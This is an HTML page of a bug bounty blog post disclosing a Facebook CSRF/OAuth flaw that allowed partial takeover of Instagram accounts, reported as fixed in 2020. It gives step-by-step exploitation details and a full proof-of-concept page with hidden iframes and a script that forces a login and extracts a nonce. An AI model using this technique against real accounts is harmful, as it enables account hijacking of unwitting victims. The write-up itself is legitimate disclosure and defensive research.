@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Facebook CSRF bug which lead to Instagram Partial account takeover. | Youssef Sammouda (sam0) personal blog</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Facebook CSRF bug which lead to Instagram Partial account takeover." />
+<meta name="author" content="qw" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Description" />
+<meta property="og:description" content="Description" />
+<link rel="canonical" href="http://localhost:4000/2020/02/28/linking-user-instagram-account-to-attackers-owned-facebook-page-then-controlling-the-account.html" />
+<meta property="og:url" content="http://localhost:4000/2020/02/28/linking-user-instagram-account-to-attackers-owned-facebook-page-then-controlling-the-account.html" />
+<meta property="og:site_name" content="Youssef Sammouda (sam0) personal blog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-02-28T18:40:08+01:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Facebook CSRF bug which lead to Instagram Partial account takeover." />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"qw"},"dateModified":"2020-02-28T18:40:08+01:00","datePublished":"2020-02-28T18:40:08+01:00","description":"Description","headline":"Facebook CSRF bug which lead to Instagram Partial account takeover.","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/2020/02/28/linking-user-instagram-account-to-attackers-owned-facebook-page-then-controlling-the-account.html"},"url":"http://localhost:4000/2020/02/28/linking-user-instagram-account-to-attackers-owned-facebook-page-then-controlling-the-account.html"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/main.css"><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="Youssef Sammouda (sam0) personal blog" /></head>
+<body><header class="site-header" role="banner">
+
+  <div class="wrapper"><a class="site-title" rel="author" href="/">Youssef Sammouda (sam0) personal blog</a><nav class="site-nav">
+        <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+        <label for="nav-trigger">
+          <span class="menu-icon">
+            <svg viewBox="0 0 18 15" width="18px" height="15px">
+              <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+            </svg>
+          </span>
+        </label>
+
+        <div class="trigger"><a class="page-link" href="/about/">About</a></div>
+      </nav></div>
+</header>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+    <h1 class="post-title p-name" itemprop="name headline">Facebook CSRF bug which lead to Instagram Partial account takeover.</h1>
+    <p class="post-meta">
+      <time class="dt-published" datetime="2020-02-28T18:40:08+01:00" itemprop="datePublished">Feb 28, 2020
+      </time>• <span itemprop="author" itemscope itemtype="http://schema.org/Person"><span class="p-author h-card" itemprop="name">qw</span></span></p>
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p><strong>Description</strong></p>
+
+<p>This bug could allow an attacker to link victim’s Instagram account to his Facebook page and then have full control of The Instagram account by just making the victim visit a malicious website and without the need of his interaction.  <br />
+The bug happens due to the logic of the Oauth flow Facebook used to ensure the linking of an Instagram account to a Facebook page.</p>
+
+<p><strong>Details</strong></p>
+
+<p>The Oauth flow return endpoint (https://m.facebook.com/page/instagram/sync/oauthlink/) which resides in Facebook side and which receives the Instagram account “code” , had a nonce parameter which normally avoid some attacks, however there was no confirmation dialog in the Instagram part to accept or refuse the request. This made possible to the attacker to perform this linking of Instagram account to his own Facebook Page after exploiting a Login CSRF and then generate a valid nonce to use in the oauth redirect URL.</p>
+
+<p><strong>Important Note:</strong> Facebook return endpoint for this oauth flow, would deny the nonce even if it’s a nonce for the current Facebook user. The nonce should be generated for the same session currently used. For that we need to get a nonce for that specific session by using an access_token linked to it.</p>
+
+<p><strong>Explanation</strong></p>
+
+<p>To get all required urls and finally write the exploit, i followed those steps :</p>
+
+<p>1) Login to the attacker Facebook account using Facebook App ( This should generate a request to <strong>api.facebook.com/method/auth.login</strong>)<br />
+We note the access_token in the response of this request.</p>
+
+<p>2) Go to Instagram App on the same phone, Login to any account, Go to Settings, Accounts, Linked Accounts, and click on Facebook. This should generate a request to <strong>m.facebook.com/auth.php</strong> endpoint. We note this request.</p>
+
+<p>Those two steps are used to get two things:</p>
+
+<ul>
+  <li>First we get a Facebook access_token associated to a certain login session</li>
+  <li>Instagram App will use the same session (by specifying a session_key) to login the user in Instagram Webview in order to complete the linking process by requesting this URL below (some would call this a Login CSRF bug):</li>
+</ul>
+
+<p><code class="language-plaintext highlighter-rouge">https://m.facebook.com/auth.php?&lt;br&gt;&lt;/br&gt;api_key=882a8490361da98702bf97a021ddc14d&lt;br&gt;&lt;/br&gt;&amp;session_key=REDACTED&lt;br&gt;&lt;/br&gt;&amp;sig=514274a37b4762e9a4210f40717e35cd&lt;br&gt;&lt;/br&gt;&amp;t=1573083437&lt;br&gt;&lt;/br&gt;&amp;uid=REDACTED&lt;br&gt;&lt;/br&gt;&amp;redirect_uri=fbconnect%3A%2F%2Fsuccess&lt;br&gt;&lt;/br&gt;.....</code></p>
+
+<p><strong>Ps</strong> : We use this method (get the Instagram app generated link) because the request to the login endpoint https://m.facebook.com/auth.php have a “<strong>sig</strong>” parameter which is used to verify that the URL was not modified ( for example to change the session_key and redirect_uri). So even if we know the parameters required for this endpoint, we still need to calculate the right URL signature. I was able to get the way the <strong>sig</strong> parameter was generated, but it didn’t work for this bug.</p>
+
+<p>3) We generate the oauth nonce with the access_token we got in “Step 1”. To do that we use Facebook <strong>https://graph.facebook.com/graphql</strong> endpoint ( This is possible because the access_token used is a first party access_token of Facebook Android/iOS app) :</p>
+
+<p><code class="language-plaintext highlighter-rouge">https://graph.facebook.com/graphql? </code><br />
+<code class="language-plaintext highlighter-rouge">doc_id=REDACTED&amp; </code><br />
+<code class="language-plaintext highlighter-rouge">method=POST&amp; </code><br />
+<code class="language-plaintext highlighter-rouge">access_token=ACCESS_TOKEN&amp; </code><br />
+<code class="language-plaintext highlighter-rouge">variables={&lt;br&gt;&lt;/br&gt;   "scale": "4",&lt;br&gt;&lt;/br&gt;   "nt_context": {&lt;br&gt;&lt;/br&gt;     "using_white_navbar": true,&lt;br&gt;&lt;/br&gt;     "styles_id": "...",&lt;br&gt;&lt;/br&gt;     "pixel_ratio": 4&lt;br&gt;&lt;/br&gt;   },&lt;br&gt;&lt;/br&gt;   "params": {&lt;br&gt;&lt;/br&gt;     "payload": "/ig_sync/connect/?page_id=ATTACKER_PAGE_ID&amp;redirect_uri=https://m.facebook.com/page/instagram/sync/oauthlink/&amp;platform=android&amp;entry_point=settings",&lt;br&gt;&lt;/br&gt;     "nt_context": {&lt;br&gt;&lt;/br&gt;       "using_white_navbar": true,&lt;br&gt;&lt;/br&gt;       "styles_id": "...",&lt;br&gt;&lt;/br&gt;       "pixel_ratio": 4&lt;br&gt;&lt;/br&gt;     }}}</code></p>
+
+<p><strong>Ps</strong>: Some URL encoding is needed in the variables parameter</p>
+
+<p>4) Now we have all the needed data to perform the attack , we create a script which do the following steps: ( For a successful attack, the victim should be logged in to his Instagram account on Desktop or Mobile ( in Instagram app Webview or mobile browser)</p>
+
+<p>4.1) Request <strong>m.facebook.com/auth.php</strong> URL in an iframe, if the victim is logged-in to his Facebook account, this request will revoke his session and unset the cookies.<br />
+4.2) Wait for 2 seconds for the sack of ensuring that Step 4.1 is done.<br />
+4.3) Request <strong>m.facebook.com/auth.php</strong> url again, this time no cookies are present so the attacker Facebook account should be logged-in in the victim browser.<br />
+4.4) Request <strong>graph.facebook.com/graphql</strong> with an access_token associated to the session we just log-in.<br />
+4.5) Request <strong>www.instagram.com/oauth/authorize</strong> with the right nonce included, this will generate a “code” and redirect to <strong>m.facebook.com/page/instagram/sync/oauthlink/</strong> with it and with a correct nonce.<br />
+3.6) After the redirection, no user interaction is required and the account is now linked to the page</p>
+
+<p>Those steps could be concluded in this script:</p>
+
+<p><code class="language-plaintext highlighter-rouge">&lt;html&gt;&lt;br&gt;&lt;/br&gt; &lt;body&gt;&lt;br&gt;&lt;/br&gt; &lt;iframe sandbox="" height="500" style="display:none;" src="&lt;strong&gt;https://m.facebook.com/auth.php?api_key=882a8490361da98702bf97a021ddc14d&amp;session_key=REDACTED&amp;sig=514274a37b4762e9a4210f40717e35cd&amp;t=1573083437&amp;uid=REDACTED&amp;redirect_uri=fbconnect%3A%2F%2Fsuccess&amp;response_type=token%2Csigned_request&amp;return_scopes=true&amp;scope=publish_actions&amp;type=user_agent&lt;/strong&gt;" /&gt;&lt;br&gt;&lt;/br&gt; &lt;/iframe&gt;&lt;br&gt;&lt;/br&gt;&lt;iframe sandbox=""  id="delayFrame" src="" width="100%" height="500" style="display:none;"&gt;&lt;br&gt;&lt;/br&gt; &lt;/iframe&gt;&lt;br&gt;&lt;/br&gt; &lt;script&gt;&lt;br&gt;&lt;/br&gt; url = 'https://graph.facebook.com/graphql?doc_id=REDACTED&amp;method=post&amp;locale=en_US&amp;pretty=false&amp;format=xml&amp;variables={"scale":"4","nt_context":{"using_white_navbar":true,"styles_id":"...","pixel_ratio":4},"params":{"payload":"/ig_sync/connect/?page_id=&lt;strong&gt;ATTACKER_PAGE_ID&lt;/strong&gt;&amp;redirect_uri=https%3A%2F%2Fm.facebook.com%2Fpage%2Finstagram%2Fsync%2Foauthlink%2F&amp;platform=android&amp;entry_point=settings","nt_context":{"using_white_navbar":true,"styles_id":"...","pixel_ratio":4}}}&amp;access_token=ACCESS_TOKEN';&lt;br&gt;&lt;/br&gt;function setIframeSrc() {&lt;br&gt;&lt;/br&gt;   var login = "&lt;strong&gt;https://m.facebook.com/auth.php?api_key=882a8490361da98702bf97a021ddc14d&amp;session_key=REDACTED&amp;sig=514274a37b4762e9a4210f40717e35cd&amp;t=1573083437&amp;uid=REDACTED&amp;redirect_uri=fbconnect%3A%2F%2Fsuccess&amp;response_type=token%2Csigned_request&amp;return_scopes=true&amp;scope=publish_actions&amp;type=user_agent&lt;/strong&gt;";&lt;br&gt;&lt;/br&gt;   var iframe1 = document.getElementById('delayFrame');&lt;br&gt;&lt;/br&gt;   iframe1.src = login;&lt;br&gt;&lt;/br&gt;   fetch(url)&lt;br&gt;&lt;/br&gt; .then(response =&gt; response.text())&lt;br&gt;&lt;/br&gt; .then(data =&gt; {&lt;br&gt;&lt;/br&gt;   nonce = data.split('nonce')[1].split('\u00252522')[2].split('\')[0];&lt;br&gt;&lt;/br&gt;   url2 = '&lt;strong&gt;https://www.instagram.com/oauth/authorize/?redirect_uri=https://m.facebook.com/page/instagram/sync/oauthlink/&amp;app_id=17951132926087090&amp;response_type=code&amp;state={"page_id":REDACTED,"platform":"msite","start_time":1572789857,"entry_point":"settings","nonce":"&lt;/strong&gt;' + nonce + '&lt;strong&gt;","permissions":null,"is_ig_link_confirmation_flow":false}&lt;/strong&gt;';&lt;br&gt;&lt;/br&gt;   window.location.href = url2;&lt;br&gt;&lt;/br&gt;}); }&lt;br&gt;&lt;/br&gt; setTimeout(setIframeSrc, 5000);&lt;br&gt;&lt;/br&gt;&lt;/script&gt;&lt;br&gt;&lt;/br&gt; &lt;/body&gt;&lt;br&gt;&lt;/br&gt; &lt;/html&gt;</code></p>
+
+<p>5) At this point, the attacker could have a server-side script that detects if an Instagram account was added to the page, so he could revoke the session in the victim browser (we already know the session_key) to avoid any chance the victim to disconnect the account.</p>
+
+<p>6) Now the attacker could basically fully control the account. He can add/delete media , create/remove comments, see email address, change profile image, see/send/delete message threads. This is done using the Instagram Graph API in Facebook and with some known GraphQL Mutations and Queries.</p>
+
+<p><strong>Impact</strong></p>
+
+<p>This bug could have allowed a malicious user to link an Instagram account to the attacker-controlled Facebook page after the Instagram user clicked on a malicious link. After the linking, the attacker could control the account without the possibility of an account takeover.</p>
+
+<p><strong>Timeline</strong></p>
+
+<p>Dec 04, 2019 — Report Sent<br />
+Dec 11, 2019 — Acknowledged by Facebook<br />
+Feb 18, 2020 — Fixed by Facebook<br />
+Mar 26, 2020 — 12,500$ bounty awarded by Facebook</p>
+
+
+  </div><a class="u-url" href="/2020/02/28/linking-user-instagram-account-to-attackers-owned-facebook-page-then-controlling-the-account.html" hidden></a>
+</article>
+
+      </div>
+    </main><footer class="site-footer h-card">
+  <data class="u-url" href="/"></data>
+
+  <div class="wrapper">
+
+    <h2 class="footer-heading">Youssef Sammouda (sam0) personal blog</h2>
+
+    <div class="footer-col-wrapper">
+      <div class="footer-col footer-col-1">
+        <ul class="contact-list">
+          <li class="p-name">Youssef Sammouda (sam0) personal blog</li></ul>
+      </div>
+
+      <div class="footer-col footer-col-2"><ul class="social-media-list"><li><a href="https://github.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#github"></use></svg> <span class="username">samm0uda</span></a></li><li><a href="https://www.twitter.com/samm0uda"><svg class="svg-icon"><use xlink:href="/assets/minima-social-icons.svg#twitter"></use></svg> <span class="username">samm0uda</span></a></li></ul>
+</div>
+
+      <div class="footer-col footer-col-3">
+        <p>The goal of this blog is to share write-ups about bugs i have found in Facebook and reported to them under the Facebook bug bounty program.</p>
+      </div>
+    </div>
+
+  </div>
+
+</footer>
+</body>
+
+</html>
